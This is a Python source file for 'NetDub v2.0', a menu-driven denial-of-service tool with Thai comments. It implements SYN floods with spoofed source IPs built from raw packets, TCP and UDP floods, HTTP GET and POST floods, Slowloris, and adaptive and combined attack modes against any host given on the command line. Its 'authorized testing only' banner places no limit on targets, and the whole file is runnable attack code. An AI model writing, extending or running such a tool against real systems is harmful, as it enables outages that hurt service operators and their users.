#!/usr/bin/env python3
import asyncio
import random
import socket
import struct
import threading
import time
import sys
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init, Style
import argparse

# Initialize colorama
init(autoreset=True)

class NetDub:
    def __init__(self, target_host, target_port=80):
        self.target_host = target_host
        self.target_port = target_port
        self.is_root = os.geteuid() == 0
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': 0
        }
        
        # User agents for HTTP attacks
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        # Payloads for different attacks
        self.http_payloads = [
            "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
            "POST / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: 1000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n",
            "HEAD / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
            "OPTIONS / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
        ]

    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                          NetDub v2.0                        ║
║                   Advanced DDoS Testing Suite               ║
║                                                              ║
║  {Fore.YELLOW}⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️{Fore.RED}         ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}

{Fore.CYAN}Target: {self.target_host}:{self.target_port}{Fore.RESET}
{Fore.CYAN}Root Access: {'✓' if self.is_root else '✗'}{Fore.RESET}
{Fore.CYAN}Advanced Features: {'Enabled' if self.is_root else 'Limited'}{Fore.RESET}
"""
        print(banner)

    def print_stats(self):
        """แสดงสถิติการทำงาน"""
        if self.stats['start_time'] > 0:
            elapsed = time.time() - self.stats['start_time']
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\n{Fore.YELLOW}═══ STATISTICS ═══{Fore.RESET}")
            print(f"{Fore.GREEN}Packets Sent: {self.stats['packets_sent']:,}{Fore.RESET}")
            print(f"{Fore.GREEN}Connections: {self.stats['connections_made']:,}{Fore.RESET}")
            print(f"{Fore.GREEN}PPS: {pps:,.2f}{Fore.RESET}")
            print(f"{Fore.RED}Errors: {self.stats['errors']:,}{Fore.RESET}")
            print(f"{Fore.CYAN}Runtime: {elapsed:.2f}s{Fore.RESET}")

    # ================== LAYER 3 ATTACKS ==================
    def create_raw_socket(self):
        """สร้าง raw socket (ต้อง root)"""
        if not self.is_root:
            return None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except:
            return None

    def create_ip_header(self, src_ip, dst_ip):
        """สร้าง IP header"""
        version = 4
        ihl = 5
        tos = 0
        tot_len = 40
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        check = 0
        saddr = socket.inet_aton(src_ip)
        daddr = socket.inet_aton(dst_ip)
        
        ihl_version = (version << 4) + ihl
        return struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    def create_tcp_header(self, src_port, dst_port, seq, ack, flags):
        """สร้าง TCP header"""
        data_offset = 5
        window = 8192
        check = 0
        urg_ptr = 0
        
        offset_res = (data_offset << 4) + 0
        return struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack, offset_res, flags, window, check, urg_ptr)

    def syn_flood(self, intensity=1000):
        """SYN Flood Attack (Layer 4)"""
        if not self.is_root:
            print(f"{Fore.RED}[!] SYN Flood requires root privileges{Fore.RESET}")
            return
        
        print(f"{Fore.YELLOW}[*] Starting SYN Flood (Layer 4) - Intensity: {intensity}{Fore.RESET}")
        
        raw_sock = self.create_raw_socket()
        if not raw_sock:
            print(f"{Fore.RED}[!] Failed to create raw socket{Fore.RESET}")
            return
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        try:
            while self.running:
                for _ in range(intensity):
                    # สร้าง fake source IP
                    src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    src_port = random.randint(1024, 65535)
                    
                    # สร้าง packet
                    ip_header = self.create_ip_header(src_ip, self.target_host)
                    tcp_header = self.create_tcp_header(src_port, self.target_port, 0, 0, 0x02)  # SYN flag
                    
                    packet = ip_header + tcp_header
                    
                    try:
                        raw_sock.sendto(packet, (self.target_host, 0))
                        self.stats['packets_sent'] += 1
                    except:
                        self.stats['errors'] += 1
                
                time.sleep(0.001)  # Short delay
                
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            raw_sock.close()

    # ================== LAYER 4 ATTACKS ==================
    def tcp_flood(self, threads=100):
        """TCP Connection Flood"""
        print(f"{Fore.YELLOW}[*] Starting TCP Flood (Layer 4) - Threads: {threads}{Fore.RESET}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def tcp_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_host, self.target_port))
                    self.stats['connections_made'] += 1
                    sock.close()
                except:
                    self.stats['errors'] += 1
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=tcp_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        try:
            while self.running:
                time.sleep(1)
                self.print_stats()
        except KeyboardInterrupt:
            self.running = False

    def udp_flood(self, packet_size=1024, intensity=1000):
        """UDP Flood Attack"""
        print(f"{Fore.YELLOW}[*] Starting UDP Flood (Layer 4) - Size: {packet_size}B, Intensity: {intensity}{Fore.RESET}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(packet_size)
        
        try:
            while self.running:
                for _ in range(intensity):
                    try:
                        sock.sendto(payload, (self.target_host, self.target_port))
                        self.stats['packets_sent'] += 1
                    except:
                        self.stats['errors'] += 1
                time.sleep(0.001)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            sock.close()

    # ================== LAYER 7 ATTACKS ==================
    def http_flood(self, threads=200):
        """HTTP Flood Attack"""
        print(f"{Fore.YELLOW}[*] Starting HTTP Flood (Layer 7) - Threads: {threads}{Fore.RESET}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def http_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_host, self.target_port))
                    
                    # สุ่ม payload
                    payload = random.choice(self.http_payloads).format(
                        self.target_host, 
                        random.choice(self.user_agents)
                    )
                    
                    sock.send(payload.encode())
                    self.stats['packets_sent'] += 1
                    sock.close()
                    
                except:
                    self.stats['errors'] += 1
                
                time.sleep(0.1)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        try:
            while self.running:
                time.sleep(1)
                self.print_stats()
        except KeyboardInterrupt:
            self.running = False

    def slowloris(self, connections=1000):
        """Slowloris Attack"""
        print(f"{Fore.YELLOW}[*] Starting Slowloris (Layer 7) - Connections: {connections}{Fore.RESET}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        sockets = []
        
        # สร้าง initial connections
        for _ in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_host, self.target_port))
                
                # ส่ง partial HTTP request
                request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Connection: keep-alive\r\n"
                
                sock.send(request.encode())
                sockets.append(sock)
                self.stats['connections_made'] += 1
                
            except:
                self.stats['errors'] += 1
        
        print(f"{Fore.GREEN}[✓] Created {len(sockets)} connections{Fore.RESET}")
        
        try:
            while self.running:
                # ส่ง headers เพื่อ keep alive
                for sock in sockets[:]:
                    try:
                        header = f"X-{random.choice(['a', 'b', 'c', 'd'])}: {random.randint(1, 5000)}\r\n"
                        sock.send(header.encode())
                        self.stats['packets_sent'] += 1
                    except:
                        sockets.remove(sock)
                        self.stats['errors'] += 1
                
                print(f"{Fore.BLUE}[*] Active connections: {len(sockets)}{Fore.RESET}")
                time.sleep(10)
                
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

    def post_flood(self, threads=100):
        """POST Flood Attack"""
        print(f"{Fore.YELLOW}[*] Starting POST Flood (Layer 7) - Threads: {threads}{Fore.RESET}")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def post_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_host, self.target_port))
                    
                    # สร้าง POST request
                    post_data = "a" * random.randint(1024, 8192)
                    request = f"POST / HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += f"Content-Length: {len(post_data)}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n"
                    request += f"Connection: keep-alive\r\n\r\n{post_data}"
                    
                    sock.send(request.encode())
                    self.stats['packets_sent'] += 1
                    sock.close()
                    
                except:
                    self.stats['errors'] += 1
                
                time.sleep(0.1)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=post_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        try:
            while self.running:
                time.sleep(1)
                self.print_stats()
        except KeyboardInterrupt:
            self.running = False

    # ================== ADAPTIVE ATTACKS ==================
    def adaptive_attack(self, mode="auto"):
        """Adaptive DDoS Attack - ปรับแต่งอัตโนมัติ"""
        print(f"{Fore.YELLOW}[*] Starting Adaptive Attack Mode{Fore.RESET}")
        
        attacks = [
            ("HTTP Flood", lambda: self.http_flood(300)),
            ("TCP Flood", lambda: self.tcp_flood(200)),
            ("Slowloris", lambda: self.slowloris(800)),
            ("POST Flood", lambda: self.post_flood(150)),
            ("UDP Flood", lambda: self.udp_flood(1024, 2000))
        ]
        
        if self.is_root:
            attacks.append(("SYN Flood", lambda: self.syn_flood(2000)))
        
        self.running = True
        
        try:
            while self.running:
                # เลือก attack แบบสุ่ม
                attack_name, attack_func = random.choice(attacks)
                print(f"{Fore.CYAN}[*] Switching to: {attack_name}{Fore.RESET}")
                
                # รัน attack สักระยะ
                attack_thread = threading.Thread(target=attack_func)
                attack_thread.daemon = True
                attack_thread.start()
                
                time.sleep(random.randint(30, 60))  # เปลี่ยน attack ทุก 30-60 วินาที
                self.running = False
                time.sleep(2)
                self.running = True
                
        except KeyboardInterrupt:
            self.running = False

    # ================== MAIN MENU ==================
    def show_menu(self):
        menu = f"""
{Fore.CYAN}═══════════════════════════════════════════════════════════════
                           ATTACK MENU
═══════════════════════════════════════════════════════════════{Fore.RESET}

{Fore.GREEN}LAYER 3/4 ATTACKS (Network/Transport){Fore.RESET}
  1. SYN Flood {'(Root Required)' if not self.is_root else '(Available)'}
  2. TCP Flood
  3. UDP Flood

{Fore.YELLOW}LAYER 7 ATTACKS (Application){Fore.RESET}
  4. HTTP Flood
  5. Slowloris
  6. POST Flood

{Fore.RED}SPECIAL ATTACKS{Fore.RESET}
  7. Adaptive Attack (Auto-switching)
  8. All-in-One (Mixed attacks)

{Fore.BLUE}OPTIONS{Fore.RESET}
  9. Show Statistics
  0. Exit

{Fore.CYAN}═══════════════════════════════════════════════════════════════{Fore.RESET}
"""
        print(menu)

    def run(self):
        """เริ่มโปรแกรม"""
        self.print_banner()
        
        if not self.is_root:
            print(f"{Fore.YELLOW}[!] Running without root privileges - Limited functionality{Fore.RESET}")
            print(f"{Fore.YELLOW}[!] For maximum power, run as: sudo python3 {sys.argv[0]}{Fore.RESET}")
        
        while True:
            self.show_menu()
            try:
                choice = input(f"{Fore.GREEN}NetDub> {Fore.RESET}").strip()
                
                if choice == "1":
                    self.syn_flood(2000)
                elif choice == "2":
                    self.tcp_flood(200)
                elif choice == "3":
                    self.udp_flood(1024, 2000)
                elif choice == "4":
                    self.http_flood(300)
                elif choice == "5":
                    self.slowloris(1000)
                elif choice == "6":
                    self.post_flood(200)
                elif choice == "7":
                    self.adaptive_attack()
                elif choice == "8":
                    print(f"{Fore.RED}[*] Launching All-in-One Attack!{Fore.RESET}")
                    # รัน multiple attacks พร้อมกัน
                    threading.Thread(target=lambda: self.http_flood(100), daemon=True).start()
                    threading.Thread(target=lambda: self.tcp_flood(100), daemon=True).start()
                    threading.Thread(target=lambda: self.slowloris(500), daemon=True).start()
                    if self.is_root:
                        threading.Thread(target=lambda: self.syn_flood(1000), daemon=True).start()
                    
                    try:
                        while True:
                            time.sleep(1)
                            self.print_stats()
                    except KeyboardInterrupt:
                        self.running = False
                        
                elif choice == "9":
                    self.print_stats()
                elif choice == "0":
                    print(f"{Fore.CYAN}[*] Exiting NetDub...{Fore.RESET}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice{Fore.RESET}")
                    
            except KeyboardInterrupt:
                self.running = False
                print(f"\n{Fore.RED}[!] Attack stopped{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")

def main():
    parser = argparse.ArgumentParser(description="NetDub - Advanced DDoS Testing Suite")
    parser.add_argument("target", help="Target host (IP or domain)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    
    args = parser.parse_args()
    
    try:
        netdub = NetDub(args.target, args.port)
        netdub.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated by user{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Fore.RESET}")

if __name__ == "__main__":
    main()
